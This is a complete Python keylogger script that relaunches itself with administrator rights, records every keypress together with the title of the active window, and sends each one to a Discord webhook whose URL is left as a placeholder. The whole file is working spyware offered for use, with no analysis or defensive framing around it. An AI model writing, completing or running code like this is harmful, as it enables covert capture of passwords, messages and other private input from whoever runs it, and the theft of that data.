from pynput.keyboard import Listener
import ctypes
import os
import sys
import pygetwindow as gw
import requests

# Discord Webhook URL
WEBHOOK_URL = 'webhook'  # Replace with your actual webhook URL

# Check for admin privileges
if ctypes.windll.shell32.IsUserAnAdmin() == 0:
    script_path = os.path.abspath(__file__)
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script_path, None, 1)

# Get the current user
user = os.getlogin()


def get_active_window_title():
    """Get the title of the currently active window."""
    try:
        active_window = gw.getActiveWindow()
        if active_window is not None:
            return active_window.title
        return "No Active Window"
    except Exception as e:
        return f"Error retrieving window title: {str(e)}"

def send_to_webhook(key, window_title):
    """Send the logged key and window title to the Discord webhook."""
    data = {
        "content": f"[{window_title}] {str(key)}"
    }
    try:
        requests.post(WEBHOOK_URL, json=data)
    except Exception as e:
        print(f"Failed to send to webhook: {str(e)}")

def on_press(key):
    # Get the active window title
    window_title = get_active_window_title()
    
    # Send the key and the current active window title to the webhook
    send_to_webhook(key, window_title)

# Start the keylogger
with Listener(on_press=on_press) as listener:
    listener.join()
